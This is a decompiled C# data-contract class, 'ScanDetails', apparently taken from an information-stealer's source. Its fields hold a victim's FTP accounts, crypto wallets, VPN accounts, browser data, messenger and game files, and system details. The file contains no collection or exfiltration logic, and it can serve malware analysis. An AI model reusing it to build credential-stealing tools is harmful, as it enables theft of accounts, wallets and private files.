using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

// Token: 0x0200005B RID: 91
[DataContract(Name = "ScanDetails", Namespace = "BrowserExtension")]
public class ScanDetails
{
	// Token: 0x17000035 RID: 53
	// (get) Token: 0x060001E3 RID: 483 RVA: 0x00003F9E File Offset: 0x0000219E
	// (set) Token: 0x060001E4 RID: 484 RVA: 0x00003FA6 File Offset: 0x000021A6
	[DataMember(Name = "SecurityUtils")]
	public List<string> SecurityUtils { get; set; } = new List<string>();

	// Token: 0x17000036 RID: 54
	// (get) Token: 0x060001E5 RID: 485 RVA: 0x00003FAF File Offset: 0x000021AF
	// (set) Token: 0x060001E6 RID: 486 RVA: 0x00003FB7 File Offset: 0x000021B7
	[DataMember(Name = "AvailableLanguages")]
	public List<string> AvailableLanguages { get; set; } = new List<string>();

	// Token: 0x17000037 RID: 55
	// (get) Token: 0x060001E7 RID: 487 RVA: 0x00003FC0 File Offset: 0x000021C0
	// (set) Token: 0x060001E8 RID: 488 RVA: 0x00003FC8 File Offset: 0x000021C8
	[DataMember(Name = "Softwares")]
	public List<string> Softwares { get; set; } = new List<string>();

	// Token: 0x17000038 RID: 56
	// (get) Token: 0x060001E9 RID: 489 RVA: 0x00003FD1 File Offset: 0x000021D1
	// (set) Token: 0x060001EA RID: 490 RVA: 0x00003FD9 File Offset: 0x000021D9
	[DataMember(Name = "Processes")]
	public List<string> Processes { get; set; } = new List<string>();

	// Token: 0x17000039 RID: 57
	// (get) Token: 0x060001EB RID: 491 RVA: 0x00003FE2 File Offset: 0x000021E2
	// (set) Token: 0x060001EC RID: 492 RVA: 0x00003FEA File Offset: 0x000021EA
	[DataMember(Name = "SystemHardwares")]
	public List<SystemHardware> SystemHardwares { get; set; } = new List<SystemHardware>();

	// Token: 0x1700003A RID: 58
	// (get) Token: 0x060001ED RID: 493 RVA: 0x00003FF3 File Offset: 0x000021F3
	// (set) Token: 0x060001EE RID: 494 RVA: 0x00003FFB File Offset: 0x000021FB
	[DataMember(Name = "Browsers")]
	public List<Browser> Browsers { get; set; } = new List<Browser>();

	// Token: 0x1700003B RID: 59
	// (get) Token: 0x060001EF RID: 495 RVA: 0x00004004 File Offset: 0x00002204
	// (set) Token: 0x060001F0 RID: 496 RVA: 0x0000400C File Offset: 0x0000220C
	[DataMember(Name = "FtpConnections")]
	public List<Account> FtpConnections { get; set; } = new List<Account>();

	// Token: 0x1700003C RID: 60
	// (get) Token: 0x060001F1 RID: 497 RVA: 0x00004015 File Offset: 0x00002215
	// (set) Token: 0x060001F2 RID: 498 RVA: 0x0000401D File Offset: 0x0000221D
	[DataMember(Name = "InstalledBrowsers")]
	public List<BrowserVersion> InstalledBrowsers { get; set; } = new List<BrowserVersion>();

	// Token: 0x1700003D RID: 61
	// (get) Token: 0x060001F3 RID: 499 RVA: 0x00004026 File Offset: 0x00002226
	// (set) Token: 0x060001F4 RID: 500 RVA: 0x0000402E File Offset: 0x0000222E
	[DataMember(Name = "ScannedFiles")]
	public List<ScannedFile> ScannedFiles { get; set; } = new List<ScannedFile>();

	// Token: 0x1700003E RID: 62
	// (get) Token: 0x060001F5 RID: 501 RVA: 0x00004037 File Offset: 0x00002237
	// (set) Token: 0x060001F6 RID: 502 RVA: 0x0000403F File Offset: 0x0000223F
	[DataMember(Name = "GameLauncherFiles")]
	public List<ScannedFile> GameLauncherFiles { get; set; } = new List<ScannedFile>();

	// Token: 0x1700003F RID: 63
	// (get) Token: 0x060001F7 RID: 503 RVA: 0x00004048 File Offset: 0x00002248
	// (set) Token: 0x060001F8 RID: 504 RVA: 0x00004050 File Offset: 0x00002250
	[DataMember(Name = "ScannedWallets")]
	public List<ScannedFile> ScannedWallets { get; set; } = new List<ScannedFile>();

	// Token: 0x17000040 RID: 64
	// (get) Token: 0x060001F9 RID: 505 RVA: 0x00004059 File Offset: 0x00002259
	// (set) Token: 0x060001FA RID: 506 RVA: 0x00004061 File Offset: 0x00002261
	[DataMember(Name = "Nord")]
	public List<Account> NordAccounts { get; set; }

	// Token: 0x17000041 RID: 65
	// (get) Token: 0x060001FB RID: 507 RVA: 0x0000406A File Offset: 0x0000226A
	// (set) Token: 0x060001FC RID: 508 RVA: 0x00004072 File Offset: 0x00002272
	[DataMember(Name = "Open")]
	public List<ScannedFile> Open { get; set; }

	// Token: 0x17000042 RID: 66
	// (get) Token: 0x060001FD RID: 509 RVA: 0x0000407B File Offset: 0x0000227B
	// (set) Token: 0x060001FE RID: 510 RVA: 0x00004083 File Offset: 0x00002283
	[DataMember(Name = "Proton")]
	public List<ScannedFile> Proton { get; set; }

	// Token: 0x17000043 RID: 67
	// (get) Token: 0x060001FF RID: 511 RVA: 0x0000408C File Offset: 0x0000228C
	// (set) Token: 0x06000200 RID: 512 RVA: 0x00004094 File Offset: 0x00002294
	[DataMember(Name = "MessageClientFiles")]
	public List<ScannedFile> MessageClientFiles { get; set; }

	// Token: 0x17000044 RID: 68
	// (get) Token: 0x06000201 RID: 513 RVA: 0x0000409D File Offset: 0x0000229D
	// (set) Token: 0x06000202 RID: 514 RVA: 0x000040A5 File Offset: 0x000022A5
	[DataMember(Name = "GameChatFiles")]
	public List<ScannedFile> GameChatFiles { get; set; }
}
